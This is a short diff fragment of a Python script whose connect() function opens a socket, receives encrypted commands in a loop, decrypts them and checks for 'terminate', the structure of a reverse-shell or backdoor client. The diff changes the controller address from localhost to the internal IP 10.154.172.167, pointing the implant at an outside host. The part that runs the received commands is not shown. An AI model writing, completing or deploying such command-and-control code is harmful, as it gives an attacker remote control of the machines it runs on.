@@ -19,7 +19,7 @@ def decrypt(cipher):
 
 def connect():
     s = socket.socket()
-    s.connect(('127.0.0.1', 8080))
+    s.connect(('10.154.172.167', 8080))
     while True:
         command = decrypt(s.recv(1024))
         if 'terminate' in command.decode():
